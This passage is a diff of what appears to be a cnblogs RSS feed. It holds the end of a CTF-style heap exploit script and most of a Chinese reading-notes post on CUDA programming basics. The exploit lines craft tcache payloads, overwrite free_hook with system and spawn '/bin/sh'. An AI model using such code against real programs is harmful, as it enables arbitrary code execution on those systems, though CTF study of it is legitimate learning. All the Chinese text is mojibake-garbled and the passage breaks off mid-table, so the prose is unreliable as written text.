+pay=p16(1)*4+p64(0x291)+p16(1)*0x3c+p64(ta)*0x2a+p64(ta-0x20)*0x16
+add(0x2f0,pay)
+add(0x2f0,p64(0)*3+p64(0x31)+b'/bin/sh\x00')
+free(0)
+pay=p16(1)*4+p64(0x291)+p16(1)*0x3c+p64(ta+0x30)*0x2a+p64(fh)*0x16
+add(0x280,pay)
+add(0x2f0,p64(sy))
+free(2)
+ti()
+</code></pre>
+<p>æè§è¿é¢è¿æºæææç.</p>
+
+
+</div>
+<div class="clear"></div>
+
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0" data-date-updated="2026-04-07 01:41">2026-04-07 01:41</span>&nbsp;
+<a href="https://www.cnblogs.com/firefly-star">firefly_star</a>&nbsp;
+éè¯»(<span id="post_view_count">1</span>)&nbsp;
+è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(19827526);return false;">æ¶è</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Ffirefly-star%2Fp%2F19827526&amp;targetId=19827526&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
+</div>
+         ]]>
+    </description>
+    </item>
+<item>
     <title><![CDATA[ 2025 ICPC ä¸æµ·å¸å¤§å­¦çç¨åºè®¾è®¡ç«èµ ä¸ªäººè¡¥é¢ç¬è®°ï¼æ­£å¨è¡¥é¢ä¸­ï¼ ]]></title>
     <link>https://www.cnblogs.com/XiaoRanMuQing/p/19824433</link>
     <guid>78cb03f060e36105140c754f9eeaa545</guid>
@@ -364,6 +1098,639 @@ signed main(){
 <a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2FXiaoRanMuQing%2Fp%2F19824433&amp;targetId=19824433&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
 </div>
          ]]>
+    </description>
+    </item>
+<item>
+    <title><![CDATA[ ãè¯»ä¹¦ç¬è®°ããCUDAç¼ç¨æåãCUDAç®ä» ]]></title>
+    <link>https://www.cnblogs.com/winteryan/p/19827116</link>
+    <guid>efb6757298361afd91fa741332939106</guid>
+    <description>
+    <![CDATA[ 
+	<h1 class="postTitle"><a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/winteryan/p/19827116" title="åå¸äº 2026-04-06 22:11">
+    <span role="heading" aria-level="2">ãè¯»ä¹¦ç¬è®°ããCUDAç¼ç¨æåãCUDAç®ä»</span>
+    
+
+</a>
+</h1>
+	<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<h1 id="ç¬¬1ç« -cudaä»ç»æ·±å¥çè§£cudaç¼ç¨æ¨¡å">ç¬¬1ç«  CUDAä»ç»ââæ·±å¥çè§£CUDAç¼ç¨æ¨¡å</h1>
+<blockquote>
+<p>æ¬æåºäº <em>CUDA Programming Guide Release 13.2</em> ç¬¬1ç« æ´çï¼è¦ç GPU ç¡¬ä»¶æ¶æãçº¿ç¨æ§è¡æ¨¡åãåå­ä½ç³»ä»¥å CUDA ç¼è¯é¾çå®æ´ç¥è¯ä½ç³»ï¼éåæä¸å® C++ åºç¡ãå¸æå¥é¨ GPU ç¼ç¨çè¯»èã</p>
+</blockquote>
+<hr>
+<h2 id="ç®å½">ç®å½</h2>
+<ul>
+<li><a href="#%E7%AC%AC1%E7%AB%A0-cuda%E4%BB%8B%E7%BB%8D%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3cuda%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B" rel="noopener nofollow">ç¬¬1ç«  CUDAä»ç»ââæ·±å¥çè§£CUDAç¼ç¨æ¨¡å</a>
+<ul>
+<li><a href="#%E7%9B%AE%E5%BD%95" rel="noopener nofollow">ç®å½</a></li>
+<li><a href="#1-gpu-%E8%AE%A1%E7%AE%97%E7%9A%84%E5%B4%9B%E8%B5%B7" rel="noopener nofollow">1. GPU è®¡ç®çå´èµ·</a></li>
+<li><a href="#2-gpu-vs-cpu%E8%AE%BE%E8%AE%A1%E5%93%B2%E5%AD%A6%E7%9A%84%E6%A0%B9%E6%9C%AC%E5%B7%AE%E5%BC%82" rel="noopener nofollow">2. GPU vs CPUï¼è®¾è®¡å²å­¦çæ ¹æ¬å·®å¼</a></li>
+<li><a href="#3-%E5%BF%AB%E9%80%9F%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8-gpu-%E7%9A%84%E5%A4%9A%E7%A7%8D%E9%80%94%E5%BE%84" rel="noopener nofollow">3. å¿«éå¼å§ï¼ä½¿ç¨ GPU çå¤ç§éå¾</a>
+<ul>
+<li><a href="#%E4%BD%BF%E7%94%A8%E7%8E%B0%E6%88%90%E5%BA%93" rel="noopener nofollow">ä½¿ç¨ç°æåº</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8-ai-%E6%A1%86%E6%9E%B6" rel="noopener nofollow">ä½¿ç¨ AI æ¡æ¶</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E7%94%A8%E8%AF%AD%E8%A8%80dsl" rel="noopener nofollow">ä½¿ç¨é¢åä¸ç¨è¯­è¨ï¼DSLï¼</a></li>
+</ul>
+</li>
+<li><a href="#4-cuda-%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B" rel="noopener nofollow">4. CUDA ç¼ç¨æ¨¡å</a>
+<ul>
+<li><a href="#41-%E5%BC%82%E6%9E%84%E7%B3%BB%E7%BB%9Fhost-%E4%B8%8E-device" rel="noopener nofollow">4.1 å¼æç³»ç»ï¼Host ä¸ Device</a></li>
+<li><a href="#42-gpu-%E7%A1%AC%E4%BB%B6sm-%E4%B8%8E-gpc" rel="noopener nofollow">4.2 GPU ç¡¬ä»¶ï¼SM ä¸ GPC</a></li>
+<li><a href="#43-%E7%BA%BF%E7%A8%8B%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84" rel="noopener nofollow">4.3 çº¿ç¨å±æ¬¡ç»æ</a>
+<ul>
+<li><a href="#%E5%86%85%E5%BB%BA%E5%8F%98%E9%87%8F" rel="noopener nofollow">åå»ºåé</a></li>
+<li><a href="#%E7%BA%BF%E7%A8%8B%E5%9D%97%E7%9A%84%E6%89%A7%E8%A1%8C%E8%A7%84%E5%88%99" rel="noopener nofollow">çº¿ç¨åçæ§è¡è§å</a></li>
+<li><a href="#%E7%BA%BF%E7%A8%8B%E6%9D%9Fwarp" rel="noopener nofollow">çº¿ç¨æï¼Warpï¼</a></li>
+<li><a href="#cluster%E7%B0%87-%E8%AE%A1%E7%AE%97%E8%83%BD%E5%8A%9B-90-%E6%96%B0%E5%A2%9E" rel="noopener nofollow">Clusterï¼ç°ï¼ââ è®¡ç®è½å 9.0 æ°å¢</a></li>
+</ul>
+</li>
+<li><a href="#44-simt-%E6%89%A7%E8%A1%8C%E6%A8%A1%E5%9E%8B%E4%B8%8E%E5%88%86%E6%94%AF%E5%8F%91%E6%95%A3" rel="noopener nofollow">4.4 SIMT æ§è¡æ¨¡åä¸åæ¯åæ£</a>
+<ul>
+<li><a href="#%E5%88%86%E6%94%AF%E5%8F%91%E6%95%A3warp-divergence" rel="noopener nofollow">åæ¯åæ£ï¼Warp Divergenceï¼</a></li>
+<li><a href="#simt-vs-simd" rel="noopener nofollow">SIMT vs SIMD</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#5-gpu-%E5%86%85%E5%AD%98%E4%BD%93%E7%B3%BB" rel="noopener nofollow">5. GPU åå­ä½ç³»</a>
+<ul>
+<li><a href="#51-%E5%85%A8%E5%B1%80%E5%86%85%E5%AD%98dram" rel="noopener nofollow">5.1 å¨å±åå­ï¼DRAMï¼</a></li>
+<li><a href="#52-%E7%89%87%E4%B8%8A%E5%86%85%E5%AD%98" rel="noopener nofollow">5.2 çä¸åå­</a></li>
+<li><a href="#53-%E7%BB%9F%E4%B8%80%E5%86%85%E5%AD%98" rel="noopener nofollow">5.3 ç»ä¸åå­</a></li>
+</ul>
+</li>
+<li><a href="#6-cuda-%E5%B9%B3%E5%8F%B0%E4%B8%8E%E7%BC%96%E8%AF%91%E9%93%BE" rel="noopener nofollow">6. CUDA å¹³å°ä¸ç¼è¯é¾</a>
+<ul>
+<li><a href="#61-%E8%AE%A1%E7%AE%97%E8%83%BD%E5%8A%9Bcompute-capability" rel="noopener nofollow">6.1 è®¡ç®è½åï¼Compute Capabilityï¼</a></li>
+<li><a href="#62-%E9%A9%B1%E5%8A%A8toolkitruntime-%E4%B8%8E-driver-api-%E7%9A%84%E5%85%B3%E7%B3%BB" rel="noopener nofollow">6.2 é©±å¨ãToolkitãRuntime ä¸ Driver API çå³ç³»</a></li>
+<li><a href="#63-ptx-%E8%99%9A%E6%8B%9F-isa" rel="noopener nofollow">6.3 PTX èæ ISA</a></li>
+<li><a href="#64-cubinfatbin-%E4%B8%8E%E7%BC%96%E8%AF%91%E4%BA%A7%E7%89%A9" rel="noopener nofollow">6.4 cubinãfatbin ä¸ç¼è¯äº§ç©</a></li>
+<li><a href="#65-%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%BC%E5%AE%B9%E6%80%A7%E4%B8%8E-ptx-%E5%85%BC%E5%AE%B9%E6%80%A7" rel="noopener nofollow">6.5 äºè¿å¶å¼å®¹æ§ä¸ PTX å¼å®¹æ§</a>
+<ul>
+<li><a href="#cubin-%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%BC%E5%AE%B9%E6%80%A7%E8%A7%84%E5%88%99" rel="noopener nofollow">cubin çäºè¿å¶å¼å®¹æ§è§å</a></li>
+<li><a href="#ptx-%E7%9A%84%E5%89%8D%E5%90%91%E5%85%BC%E5%AE%B9%E6%80%A7" rel="noopener nofollow">PTX çååå¼å®¹æ§</a></li>
+</ul>
+</li>
+<li><a href="#66-jit-%E7%BC%96%E8%AF%91" rel="noopener nofollow">6.6 JIT ç¼è¯</a></li>
+</ul>
+</li>
+<li><a href="#7-%E6%80%BB%E7%BB%93" rel="noopener nofollow">7. æ»ç»</a></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="1-gpu-è®¡ç®çå´èµ·">1. GPU è®¡ç®çå´èµ·</h2>
+<p>GPUï¼å¾å½¢å¤çå¨ï¼æåæ¯ä¸ºå®æ¶ 3D æ¸²æè®¾è®¡ç<strong>ä¸ç¨å®å¶ç¡¬ä»¶</strong>ï¼è´è´£åºå®åè½çå¹¶è¡å¾å½¢æµæ°´çº¿å éãå°äº 2003 å¹´ï¼å¾å½¢æ¸²æç®¡çº¿çé¨åé¶æ®µåå¾<strong>å®å¨å¯ç¼ç¨</strong>ï¼å¼åèå¯ä»¥ä¸ºåºæ¯ä¸­çæ¯ä¸ä¸ªåç´ æé¡¶ç¹è¿è¡èªå®ä¹ä»£ç ã</p>
+<p>è¿ä¸å¯ç¼ç¨è½åå¼åäºç ç©¶èçæ³è±¡ï¼è½å¦æ GPU å¼ºå¤§çå¹¶è¡è®¡ç®è½åç¨å°å¾å½¢ä»¥å¤çé¢åï¼2006 å¹´ï¼NVIDIA æ­£å¼æ¨åº <strong>CUDAï¼Compute Unified Device Architectureï¼ç»ä¸è®¡ç®è®¾å¤æ¶æï¼</strong>ï¼ä½¿å¾å¼åèå¯ä»¥è±ç¦»å¾å½¢ APIï¼å°ä»»æè®¡ç®å·¥ä½è´è½½äº¤ç» GPU æ¥å éã</p>
+<p>èªæ­¤ï¼GPU è®¡ç®è¢«å¹¿æ³ç¨äºï¼</p>
+<ul>
+<li>æµä½å¨åå­¦ãè½éä¼ è¾ç­ç§å­¦ä»¿ç</li>
+<li>æ°æ®åºä¸å¤§æ°æ®åæ</li>
+<li>å¾ååç±»ãæ©æ£æ¨¡åãå¤§è¯­è¨æ¨¡åç­ AI ææ¯</li>
+</ul>
+<p>GPU çå¯ç¼ç¨æ§å·²æä¸ºç°ä»£ AI åºç¡è®¾æ½ä¸å¯æç¼ºçåºç³ã</p>
+<hr>
+<h2 id="2-gpu-vs-cpuè®¾è®¡å²å­¦çæ ¹æ¬å·®å¼">2. GPU vs CPUï¼è®¾è®¡å²å­¦çæ ¹æ¬å·®å¼</h2>
+<p>GPU å CPU å¨è®¾è®¡ç®æ ä¸æçæ ¹æ¬å·®å¼ã</p>
+<table>
+<thead>
+<tr>
+<th>ç»´åº¦</th>
+<th>CPU</th>
+<th>GPU</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>æ ¸å¿ç®æ </td>
+<td>æå¿«æ§è¡åæ¡ä¸²è¡çº¿ç¨ï¼ä½å»¶è¿ï¼</td>
+<td>åæ¶æ§è¡æ°åçº¿ç¨ï¼é«ååï¼</td>
+</tr>
+<tr>
+<td>å¹¶åçº¿ç¨æ°</td>
+<td>å åä¸ª</td>
+<td>æ°ä¸è³æ°åä¸ä¸ª</td>
+</tr>
+<tr>
+<td>æ¶ä½ç®¡åé</td>
+<td>å¤§éç¨äºç¼å­åæµæ§å¶</td>
+<td>å¤§éç¨äºæ°æ®è®¡ç®åå</td>
+</tr>
+<tr>
+<td>åçº¿ç¨æ§è½</td>
+<td>å¼º</td>
+<td>ç¸å¯¹å¼±</td>
+</tr>
+<tr>
+<td>æ»è®¡ç®ååé</td>
+<td>ç¸å¯¹ä½</td>
+<td>æé«</td>
+</tr>
+</tbody>
+</table>
+<p>ä¸å¾ç´è§å±ç¤ºäºä¸¤èçæ¶ä½ç®¡åéå·®å¼ï¼</p>
+<p><img alt="CPU vs GPU æ¶ä½ç®¡åéå¯¹æ¯" loading="lazy" data-src="https://my-ai-doc.oss-cn-shenzhen.aliyuncs.com/CUDA%20Programming%20Guide/Ch1/figure1_cpu_vs_gpu.jpg" class="lazyload"></p>
+<blockquote>
+<p>CPU ä»¥ç¼å­åæµæ§å¶ï¼Controlï¼ä¸ºä¸»ï¼GPU åå°ç»å¤§å¤æ°æ¶ä½ç®¡æå¥å°è®¡ç®æ ¸å¿ï¼ALUï¼ã</p>
+</blockquote>
+<p>è¿ä¸å·®å¼å³å®äº GPU éå¸¸éå<strong>æ°æ®å¹¶è¡</strong>ï¼Data-Parallelï¼çè®¡ç®åºæ¯ï¼å¤§éæ°æ®ååæ ·çæä½ï¼èä¸éè¦å¤æçä¸²è¡ä¾èµå³ç³»ã</p>
+<hr>
+<h2 id="3-å¿«éå¼å§ä½¿ç¨-gpu-çå¤ç§éå¾">3. å¿«éå¼å§ï¼ä½¿ç¨ GPU çå¤ç§éå¾</h2>
+<p>ç´æ¥ç¼å CUDA ä»£ç å¹¶ä¸æ¯ä½¿ç¨ GPU çå¯ä¸æ¹å¼ãæ ¹æ®åºæ¯ä¸åï¼æä»¥ä¸å ç§ç±æµå¥æ·±çéå¾ï¼</p>
+<h3 id="ä½¿ç¨ç°æåº">ä½¿ç¨ç°æåº</h3>
+<p>NVIDIA æä¾äºå¤§ééå¯¹å GPU æ¶ææ·±åº¦ä¼åçåºï¼å¾å¾æ¯èªå·±å®ç°çæ§è½æ´å¥½ï¼</p>
+<table>
+<thead>
+<tr>
+<th>åºå</th>
+<th>ç¨é</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>cuBLAS</strong></td>
+<td>çº¿æ§ä»£æ°ï¼ç©éµä¹æ³ç­ï¼</td>
+</tr>
+<tr>
+<td><strong>cuFFT</strong></td>
+<td>å¿«éåéå¶åæ¢</td>
+</tr>
+<tr>
+<td><strong>cuDNN</strong></td>
+<td>æ·±åº¦ç¥ç»ç½ç»</td>
+</tr>
+<tr>
+<td><strong>CUTLASS</strong></td>
+<td>æ¨¡æ¿åç©éµä¹æ³</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ä½¿ç¨-ai-æ¡æ¶">ä½¿ç¨ AI æ¡æ¶</h3>
+<p>PyTorchãTensorFlow ç­æ¡æ¶å¨åºå±è°ç¨ä¸è¿°åºæ¥å®ç° GPU å éï¼ç¨æ·æ éæç¥ CUDA ç»èã</p>
+<h3 id="ä½¿ç¨é¢åä¸ç¨è¯­è¨dsl">ä½¿ç¨é¢åä¸ç¨è¯­è¨ï¼DSLï¼</h3>
+<ul>
+<li><strong>NVIDIA Warp</strong>ï¼é¢åç©çä»¿çç Python DSLï¼ç¼è¯è³ CUDA æ§è¡ã</li>
+<li><strong>OpenAI Triton</strong>ï¼é¢åæ·±åº¦å­¦ä¹ ç®å­å¼åç Python DSLï¼ç¼è¯è³ PTX/CUDAã</li>
+</ul>
+<p>ä»¥ä¸éå¾åæå»ºäº CUDA å¹³å°ä¹ä¸ãæ¬æåç»­èç¦äºç´æ¥ç¼å CUDA ä»£ç çæ ¸å¿æ¦å¿µã</p>
+<hr>
+<h2 id="4-cuda-ç¼ç¨æ¨¡å">4. CUDA ç¼ç¨æ¨¡å</h2>
+<h3 id="41-å¼æç³»ç»host-ä¸-device">4.1 å¼æç³»ç»ï¼Host ä¸ Device</h3>
+<p>CUDA ç¼ç¨æ¨¡ååè®¾ä¸ä¸ª<strong>å¼æè®¡ç®ç³»ç»</strong>ï¼å³åæ¶åå« CPU å GPU çç³»ç»ã</p>
+<table>
+<thead>
+<tr>
+<th>æ¯è¯­</th>
+<th>å«ä¹</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Host</strong></td>
+<td>CPU åå¶ç´æ¥è¿æ¥çåå­ï¼ä¸»æºåå­ï¼</td>
+</tr>
+<tr>
+<td><strong>Device</strong></td>
+<td>GPU åå¶ç´æ¥è¿æ¥çæ¾å­ï¼è®¾å¤åå­ï¼</td>
+</tr>
+<tr>
+<td><strong>Host Code</strong></td>
+<td>è¿è¡å¨ CPU ä¸çä»£ç </td>
+</tr>
+<tr>
+<td><strong>Device Code / Kernel</strong></td>
+<td>è¿è¡å¨ GPU ä¸çä»£ç </td>
+</tr>
+</tbody>
+</table>
+<p>CUDA åºç¨<strong>å§ç»ä» CPU å¼å§æ§è¡</strong>ãHost Code éè¿ CUDA API å®æä¸ä»¶äºï¼</p>
+<ol>
+<li>å¨ Host åå­å Device åå­ä¹é´æ·è´æ°æ®</li>
+<li>å¯å¨ï¼Launchï¼æ ¸å½æ°ï¼Kernelï¼å¨ GPU ä¸å¹¶è¡æ§è¡</li>
+<li>ç­å¾æ°æ®æ·è´æ GPU æ§è¡å®æ</li>
+</ol>
+<p>CPU å GPU å¯ä»¥<strong>åæ¶è¿è¡</strong>ï¼æä¼æ§è½éå¸¸æ¥èªæå¤§åä¸¤èçå©ç¨çã</p>
+<h3 id="42-gpu-ç¡¬ä»¶sm-ä¸-gpc">4.2 GPU ç¡¬ä»¶ï¼SM ä¸ GPC</h3>
+<p>å¯¹äº CUDA ç¼ç¨èè¨ï¼GPU å¯ä»¥è¢«çè§£ä¸ºä»¥ä¸ç¡¬ä»¶å±æ¬¡ï¼</p>
+<pre><code>GPU
+âââ GPCï¼å¾å½¢å¤çéç¾¤ï¼Graphics Processing Clusterï¼ÃN
+    âââ SMï¼æµå¤å¤çå¨ï¼Streaming Multiprocessorï¼ÃM
+        âââ æ¬å°å¯å­å¨æä»¶ï¼Register Fileï¼
+        âââ ç»ä¸æ°æ®ç¼å­ï¼Unified Data Cacheï¼
+        â   âââ L1 Cacheï¼èªå¨ç¼å­ï¼
+        â   âââ Shared Memoryï¼å¯ç¼ç¨å±äº«åå­ï¼
+        âââ å¤ä¸ªåè½è®¡ç®ååï¼ALU ç­ï¼
+</code></pre>
+<p>æ¯ä¸ª SM åé¨ç Unified Data Cache å¨ç©çä¸æ¯åä¸åèµæºï¼ä½å¯ä»¥å¨è¿è¡æ¶éç½® L1 Cache å Shared Memory çæ¯ä¾åéã</p>
+<p>ä¸å¾å±ç¤ºäº GPU çå®æ´ç¡¬ä»¶æ¶æï¼</p>
+<p><img alt="GPUç¡¬ä»¶æ¶æ" loading="lazy" data-src="https://my-ai-doc.oss-cn-shenzhen.aliyuncs.com/CUDA%20Programming%20Guide/Ch1/figure2_hardware_architecture.jpg" class="lazyload"></p>
+<blockquote>
+<p>GPU éè¿ PCIe æ NVLINK ä¸ CPU ç¸è¿ã</p>
+</blockquote>
+<h3 id="43-çº¿ç¨å±æ¬¡ç»æ">4.3 çº¿ç¨å±æ¬¡ç»æ</h3>
+<p>CUDA ççº¿ç¨ç»ç»æ¯çè§£ç¼ç¨æ¨¡åçæ ¸å¿ãä»å°å°å¤§ä¾æ¬¡ä¸ºï¼</p>
+<pre><code>Threadï¼çº¿ç¨ï¼
+    â Ã32
+Warpï¼çº¿ç¨æï¼
+    â ÃN
+Thread Blockï¼çº¿ç¨åï¼
+    â ÃM [å¯éï¼è®¡ç®è½å 9.0+]
+Clusterï¼ç°ï¼
+    â ÃK
+Gridï¼ç½æ ¼ï¼
+</code></pre>
+<p>æ¯å¯å¨ä¸ä¸ª Kernelï¼æ´ä½æ§è¡çææçº¿ç¨ææä¸ä¸ª <strong>Gridï¼ç½æ ¼ï¼</strong>ã</p>
+<p><img alt="Gridä¸Thread Blockå±æ¬¡ç»æ" loading="lazy" data-src="https://my-ai-doc.oss-cn-shenzhen.aliyuncs.com/CUDA%20Programming%20Guide/Ch1/figure3_grid_thread_blocks.jpg" class="lazyload"></p>
+<h4 id="åå»ºåé">åå»ºåé</h4>
+<p>å¨ Kernel åï¼æ¯ä¸ªçº¿ç¨éè¿ä»¥ä¸åå»ºåéç¡®å®èªå·±ç"èº«ä»½"ï¼</p>
+<table>
+<thead>
+<tr>
+<th>åé</th>
+<th>ç±»å</th>
+<th>å«ä¹</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>threadIdx</code></td>
+<td><code>dim3</code></td>
+<td>çº¿ç¨å¨å¶<strong>çº¿ç¨åå</strong>çä½ç½®ï¼x/y/zï¼</td>
+</tr>
+<tr>
+<td><code>blockIdx</code></td>
+<td><code>dim3</code></td>
+<td>çº¿ç¨åå¨<strong>ç½æ ¼å</strong>çä½ç½®ï¼x/y/zï¼</td>
+</tr>
+<tr>
+<td><code>blockDim</code></td>
+<td><code>dim3</code></td>
+<td>çº¿ç¨åçç»´åº¦å¤§å°ï¼x/y/zï¼</td>
+</tr>
+<tr>
+<td><code>gridDim</code></td>
+<td><code>dim3</code></td>
+<td>ç½æ ¼çç»´åº¦å¤§å°ï¼x/y/zï¼</td>
+</tr>
+</tbody>
+</table>
+<p>çº¿ç¨ååç½æ ¼åæ¯æ <strong>1ã2ã3 ç»´</strong>å¸å±ï¼æ¹ä¾¿å°çº¿ç¨æ å°å°ä¸åå½¢ç¶çæ°æ®ã</p>
+<p>ä»¥ä¸ç»´ç½æ ¼ä¸ºä¾ï¼è®¡ç®æ¯ä¸ªçº¿ç¨çå¨å±å¯ä¸ç´¢å¼ï¼</p>
+<pre><code class="language-cpp">__global__ void kernel() {
+    int globalIdx = blockIdx.x * blockDim.x + threadIdx.x;
+    // ä½¿ç¨ globalIdx å³å®è¯¥çº¿ç¨è´è´£å¤çåªä¸ªæ°æ®åç´ 
+}
+</code></pre>
+<h4 id="çº¿ç¨åçæ§è¡è§å">çº¿ç¨åçæ§è¡è§å</h4>
+<ul>
+<li><strong>åä¸çº¿ç¨åå</strong>çææçº¿ç¨ä¿è¯è¿è¡å¨<strong>åä¸ä¸ª SM</strong> ä¸ï¼å¯éè¿å±äº«åå­é«æéä¿¡ä¸åæ­¥ã</li>
+<li><strong>ä¸åçº¿ç¨åä¹é´</strong>ç¸äºç¬ç«ï¼æ§è¡é¡ºåºä»»æï¼ä¸è½ææ°æ®ä¾èµå³ç³»ã</li>
+<li>ä¸ä¸ª Grid å¯ä»¥åå«æ°ç¾ä¸ä¸ªçº¿ç¨åï¼GPU çè°åº¦å¨å°å¶ååè³å¯ç¨ç SM æ§è¡ã</li>
+</ul>
+<p>ä¸å¾å±ç¤ºäº Grid ä¸­ççº¿ç¨åå¦ä½è¢«åéå°å SM ä¸æ§è¡ï¼</p>
+<p><img alt="çº¿ç¨åè°åº¦å°SM" loading="lazy" data-src="https://my-ai-doc.oss-cn-shenzhen.aliyuncs.com/CUDA%20Programming%20Guide/Ch1/figure4_block_to_sm.jpg" class="lazyload"></p>
+<blockquote>
+<p>æ¯ä¸ª SM åæ¶æ¿è½½å¤ä¸ªçº¿ç¨åï¼ä½çº¿ç¨åä¹é´çè°åº¦é¡ºåºæ²¡æä»»ä½ä¿è¯ã</p>
+</blockquote>
+<h4 id="çº¿ç¨æwarp">çº¿ç¨æï¼Warpï¼</h4>
+<p>çº¿ç¨ååççº¿ç¨ä»¥ <strong>32 ä¸ªä¸ºä¸ç»</strong>ç»æä¸ä¸ª <strong>Warpï¼çº¿ç¨æï¼</strong>ãWarp æ¯ GPU è°åº¦åæ§è¡çåºæ¬ååã</p>
+<blockquote>
+<p><strong>æä½³å®è·µ</strong>ï¼çº¿ç¨åççº¿ç¨æ»æ°æå¥½æ¯ <strong>32 çæ´æ°å</strong>ãè¥ä¸æ¯æ´æ°åï¼æåä¸ä¸ª Warp ä¼æè¥å¹²ç©ºé² Laneï¼å¯¼è´è®¡ç®ååæµªè´¹ã</p>
+</blockquote>
+<h4 id="clusterç°-è®¡ç®è½å-90-æ°å¢">Clusterï¼ç°ï¼ââ è®¡ç®è½å 9.0 æ°å¢</h4>
+<p>éç GPU å SM æ°éçä¸æ­å¢å¤ï¼è·¨çº¿ç¨åçéä¿¡å¦æåªè½ä¾èµå¨å±åå­ï¼æçæä½ãä¸ºæ­¤ï¼è®¡ç®è½å 9.0ï¼Hopper æ¶æï¼å¦ H100ï¼å¼å¥äº<strong>ç°ï¼Clusterï¼</strong>è¿ä¸å¯éåç»å±çº§ï¼ä½äºçº¿ç¨ååç½æ ¼ä¹é´ã</p>
+<p>ç°çç¹æ§ï¼</p>
+<ul>
+<li>åä¸ç°åçææçº¿ç¨å<strong>è°åº¦å°åä¸ GPC</strong> åçå SM ä¸ï¼ä¸<strong>åæ¶æ§è¡</strong>ã</li>
+<li>ç°åä¸ååççº¿ç¨å¯éè¿ <strong>Cooperative Groups</strong> API è¿è¡éä¿¡ä¸åæ­¥ã</li>
+<li>ç°åçº¿ç¨å¯è®¿é®å GPC åææçº¿ç¨åçå±äº«åå­ï¼ç§°ä¸º<strong>åå¸å¼å±äº«åå­ï¼Distributed Shared Memoryï¼</strong>ã</li>
+</ul>
+<p>ä¸å¾å±ç¤ºäºå«ç°çç½æ ¼é»è¾ç»æï¼Grid â Cluster â Block ä¸å±åµå¥ï¼ï¼</p>
+<p><img alt="å«Clusterçç½æ ¼ç»æ" loading="lazy" data-src="https://my-ai-doc.oss-cn-shenzhen.aliyuncs.com/CUDA%20Programming%20Guide/Ch1/figure5_grid_with_cluster.jpg" class="lazyload"></p>
+<p>ä¸å¾å±ç¤ºäºç°åçº¿ç¨åå¦ä½è¢«åæ¶è°åº¦å°åä¸ GPC åçå SMï¼</p>
+<p><img alt="Clusterè°åº¦å°GPC" loading="lazy" data-src="https://my-ai-doc.oss-cn-shenzhen.aliyuncs.com/CUDA%20Programming%20Guide/Ch1/figure6_cluster_to_gpc.jpg" class="lazyload"></p>
+<h3 id="44-simt-æ§è¡æ¨¡åä¸åæ¯åæ£">4.4 SIMT æ§è¡æ¨¡åä¸åæ¯åæ£</h3>
+<p>Warp å 32 ä¸ªçº¿ç¨ä»¥ <strong>SIMTï¼Single Instruction Multiple Threadsï¼åæä»¤å¤çº¿ç¨ï¼</strong> æ¹å¼æ§è¡ï¼ææçº¿ç¨åæ¶æ§è¡<strong>åä¸æ¡æä»¤</strong>ï¼ä½æ¯ä¸ªçº¿ç¨æä½ç<strong>æ°æ®ä¸å</strong>ï¼ç±åèªç <code>threadIdx</code>/<code>blockIdx</code> å³å®ï¼ã</p>
+<h4 id="åæ¯åæ£warp-divergence">åæ¯åæ£ï¼Warp Divergenceï¼</h4>
+<p>å½ Warp åççº¿ç¨èµ°ä¸ä¸åçåæ¯æ¶ï¼å°±ä¼åç<strong>åæ¯åæ£</strong>ï¼</p>
+<pre><code>if (threadIdx.x % 2 == 0) {
+    a = r(t);   // ä»å¶æ° lane æ§è¡
+} else {
+    a = q(t);   // ä»å¥æ° lane æ§è¡
+}
+y = f(a);       // å¨é¨ lane æ§è¡
+</code></pre>
+<p>æ§è¡è¿ç¨ï¼</p>
+<ol>
+<li>åæ§è¡ <code>if</code> åæ¯ï¼å¥æ° lane è¢«<strong>æ©ç å±è½ï¼masked offï¼</strong>ç­å¾</li>
+<li>åæ§è¡ <code>else</code> åæ¯ï¼å¶æ° lane è¢«æ©ç å±è½ç­å¾</li>
+<li>æåææ lane æ§è¡ <code>y = f(a)</code></li>
+</ol>
+<p>è¿æå³çä¸¤æ®µä»£ç <strong>ä¸²è¡æ§è¡</strong>ï¼åæ¬å¹¶è¡çè½åè¢«æåæµªè´¹ãä¸å¾ç´è§å±ç¤ºäºå Lane å¨åæ¯æ§è¡æ¶çæ©ç ç¶æï¼</p>
+<p><img alt="Warp Divergence Laneæ©ç " loading="lazy" data-src="https://my-ai-doc.oss-cn-shenzhen.aliyuncs.com/CUDA%20Programming%20Guide/Ch1/figure7_warp_divergence.jpg" class="lazyload"></p>
+<blockquote>
+<p>ç»¿è² Lane ä¸ºæ´»è·æ§è¡ï¼ç°è² Lane ä¸ºæ©ç ç­å¾ç¶æãå æ­¤ï¼<strong>åå° Warp ååæ¯åæ£</strong>æ¯ CUDA æ§è½ä¼åçéè¦ç®æ ã</p>
+</blockquote>
+<h4 id="simt-vs-simd">SIMT vs SIMD</h4>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>SIMD</th>
+<th>SIMT</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>æ§å¶æµ</td>
+<td>ç»ä¸ï¼åä¸è·¯å¾</td>
